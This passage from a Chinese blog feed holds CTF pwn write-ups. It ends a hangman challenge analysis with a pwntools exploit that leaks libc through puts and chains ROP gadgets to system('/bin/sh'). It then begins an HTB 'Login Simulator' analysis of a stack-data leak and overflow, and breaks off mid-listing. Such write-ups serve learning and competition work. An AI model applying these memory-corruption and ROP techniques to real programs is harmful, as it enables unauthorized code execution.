class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> guessed[<span class="number">7</span>]; <span class="comment">// [rsp+1h] [rbp-3Fh]</span></span><br><span class="line">  <span class="keyword">char</span> guess_buffer[<span class="number">16</span>]; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">16</span>]; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  game_0 state; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v10 = v3;</span><br><span class="line">  init_game();</span><br><span class="line">  *(_QWORD *)&amp;state.attempts = <span class="number">0L</span>L;</span><br><span class="line">  *(_DWORD *)&amp;state.words[<span class="number">6</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)<span class="built_in">buffer</span> = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)&amp;<span class="built_in">buffer</span>[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)guess_buffer = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)&amp;guess_buffer[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">  *(_DWORD *)guessed = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;guessed[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  guessed[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !state.game_over &amp;&amp; !state.solved )</span><br><span class="line">  &#123;</span><br><span class="line">    print_game(&amp;state);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter letter: "</span>);</span><br><span class="line">    v4 = fgets(<span class="built_in">buffer</span>, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v4;</span><br><span class="line">    *((_BYTE *)&amp;v10 + <span class="built_in">strcspn</span>(<span class="built_in">buffer</span>, <span class="string">"\n"</span>) - <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(<span class="built_in">buffer</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      char_comp(<span class="built_in">buffer</span>, <span class="string">"v&#125;zsuag"</span>, guessed, state.attempts, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( state.attempts == <span class="number">6</span> )</span><br><span class="line">        state.game_over = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"FINAL GUESS\nEnter word: "</span>, <span class="string">"v&#125;zsuag"</span>);</span><br><span class="line">      v4 = fgets(guess_buffer, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v4;</span><br><span class="line">      <span class="keyword">if</span> ( compare_enc(guess_buffer, <span class="string">"v&#125;zsuag"</span>, <span class="number">7</span>) )</span><br><span class="line">        state.solved = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">strcpy</span>(state.words[state.attempts], <span class="built_in">buffer</span>);</span><br><span class="line">      enc(state.words[state.attempts], <span class="number">1</span>);</span><br><span class="line">      ++state.attempts;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"\n\tINVALID INPUT"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  print_game(&amp;state);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个功能有点沉于，首先这个猜测在一个循环里进行。但是这个循环由两参数控制<code>game_over</code>和<code>solved</code>控制，其中一个为真则循环结束。</p><p>而这个猜测有两个阶段：</p><p>第一个阶段要求输入这个字符，如何这个字符在目的字符里则显现出来。若输入不是一个字符则重新进入第一阶段。</p><p>第二阶段是输入一个字符串与目的字符串比较，若比较成功则solved为真。若二阶段进行了6次则game_over为真。</p><p>但是在布局时奇怪：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)&amp;state.words</span><br><span class="line">*(_QWORD *)&amp;state.game_over</span><br></pre></td></tr></table></figure><p><code>state.words</code>与<code>state.game_over</code>两者相临，即state.word结束后的高地址就是<code>state.game_over</code>.这样我们就有机会覆盖<code>state.game_over</code>.</p><p>同时代码中用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(state.words[state.attempts], <span class="built_in">buffer</span>);</span><br></pre></td></tr></table></figure><p>来写入words。</p><p>而strcpy有个特性：</p><blockquote><p>strcpy，即string copy（字符串复制）的缩写。</p><p>strcpy是<a href="https://baike.baidu.com/item/C%2B%2B/99272" target="_blank" rel="noopener">C++</a>语言的一个标准函数 ，strcpy把含有<a href="https://baike.baidu.com/item/' target="_blank" rel="noopener"\0'/9931274">‘\0’</a>结束符的字符串复制到另一个<a href="https://baike.baidu.com/item/地址空间" target="_blank" rel="noopener">地址空间</a>，返回值的类型为char*。</p></blockquote><p>换句话说，strcpy会在一个字符串后自动添加上’\x00’.</p><p>这样我们就有机会覆盖<code>state.game_over</code></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这样算我们输入6次就可以覆盖<code>state.game_over</code>那么为什么我们正常运行时，很难发现这个问题？</p><p>因为我们在覆盖<code>state.game_over</code>后，程序开始了下一次循环，<code>strcpy(state.words[state.attempts], buffer);</code>将覆盖<code>state.game_over</code>为我们输入的字符。这样’\x00’就被覆盖掉。因此我们得将<code>state.game_over</code>为0进行保留。</p><p>但是若我们输入’\x00’，<code>strlen(buffer)</code>将判断失败，无法写入<code>state.words</code></p><p>.幸好，题目中留个异或：<code>env()</code>函数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">enc</span><span class="params">(<span class="keyword">char</span> *words, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; length; ++i )</span><br><span class="line">    words[i] ^= <span class="number">0x34</span>u;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就可以输入‘\x34’字符来代替‘\x00’.从而无限制写入栈。</p><p>剩下就是简单栈溢出。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/04/3 10:13:59</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./hangpwn'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x00000000004016dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016de : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016df : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004011dd : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">xxxx=<span class="string">'BINGAUS'</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">10</span>):</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">p.sendline(<span class="string">'S'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wtaddr</span><span class="params">(addr)</span>:</span></span><br><span class="line">add=<span class="number">0x100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">xx=addr%add</span><br><span class="line">p.sendline(chr((addr%add)^<span class="number">0x34</span>))</span><br><span class="line">addr=addr//add</span><br><span class="line">p.sendline(<span class="string">'lexsd6'</span>)</span><br><span class="line"></span><br><span class="line">wtaddr(<span class="number">0x00000000004016e3</span>)</span><br><span class="line">wtaddr(e.got[<span class="string">'puts'</span>])</span><br><span class="line">wtaddr(e.sym[<span class="string">'puts'</span>])</span><br><span class="line">wtaddr(e.sym[<span class="string">'main'</span>])</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'BINGAUS'</span>)</span><br><span class="line"></span><br><span class="line">libcaddr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(libcaddr))</span><br><span class="line">x=finder(<span class="string">'puts'</span>,libcaddr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">10</span>):</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">p.sendline(<span class="string">'S'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wtaddr(<span class="number">0x00000000004016e3</span>)</span><br><span class="line">wtaddr(x.dump(<span class="string">'str_bin_sh'</span>))</span><br><span class="line">wtaddr(<span class="number">0x000000000040101a</span>)</span><br><span class="line">wtaddr(x.dump(<span class="string">'system'</span>))</span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(<span class="string">'BINGAUS'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个比赛很迷惑。感觉大多题很水但是ctftime比重高。这是其中一个有点意思的题</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Login Simulator-pwn-challenge-wp</title>
    <link href="lexsd6.github.io/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/"/>
    <id>lexsd6.github.io/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/</id>
    <published>2022-04-03T13:53:51.338Z</published>
    <updated>2022-04-04T08:30:22.501Z</updated>
    
    <content type="html"><![CDATA[<p>一道意义题，让我学会了很多…比如明白了大佬总再说“F5 只是看乐子，干正事还是得看汇编”<a id="more"></a></p><h2 id="程序流程分析"><a href="#程序流程分析" class="headerlink" title="程序流程分析"></a>程序流程分析</h2><p>题目开了PIE 、canary，NX保护。</p><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabledRUNPATH:  b&apos;./glibc&apos;</code></pre><p>程序的mian函数伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+7h] [rbp-A9h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">setup</span>(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)__isoc99_scanf(<span class="string">"%d"</span>, &amp;v6) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Something went wrong.\n"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="keyword">register</span>(&amp;v8);</span><br><span class="line">      <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      v5 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        login((<span class="keyword">const</span> struct utmp *)&amp;v8);</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Good job! :^)"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Invalid username! :)"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"You need to register first."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid option.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的主要逻辑简单，主要是注册（register）、登录（login）及退出（exit）3个功能。</p><p>我们进行跟进注册（register）可以看到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">register</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#123;i&#125; Username length: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)__isoc99_scanf(<span class="string">"%d"</span>, &amp;v2) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v2 &gt; <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)v2 &lt;= <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"&#123;i&#125; Enter username: "</span>, &amp;v2);</span><br><span class="line">      getInput(a1, v2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Username registered successfully!"</span>);</span><br><span class="line">      result = v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid length."</span>);</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something went wrong!"</span>);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然，函数对我们输入的数据有合法的限制，但检测的是我们输入的数据长度。导致我们输入的数据可以小于我们原本设置的输入数据大小。</p><p>于是跟进到login函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">(<span class="keyword">const</span> struct utmp *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#123;i&#125; Username: "</span>);</span><br><span class="line">  getInput(&amp;s1, v1);</span><br><span class="line">  <span class="built_in">strncmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)entry, (<span class="keyword">signed</span> <span class="keyword">int</span>)v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在login函数的检测中，v1是由我们输入的“数据长度”。但我们实际的输入数据没那么多，导致可能我们泄露栈上数据。</p><h2 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h2><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>我们分析getInput函数，getinput的作用是将数据一个一个字符写入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">getInput</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+16h] [rbp-Ah]</span></span><br><span class="line">  <span class="keyword">char</span> i; <span class="comment">// [rsp+17h] [rbp-9h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 &gt; i &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &gt; <span class="number">0</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf != <span class="number">0x20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf == <span class="number">0xA</span> )</span><br><span class="line">        <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们乍看，可以没用什么问题。用于输入的第二参数在调用前就被我们严格的限制。</p><p>但是在对字符串处理时，对0x20对应的字符’ ‘(空格)执行跳过，导致栈上原本存放的数据继续保留下来。</p><p>再加上之前，login的验证功能，导致我们可以一个个把部分栈上数据泄露出来。</p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>再回到getInput函数，看反汇编代码看不出毛病，但是审计汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 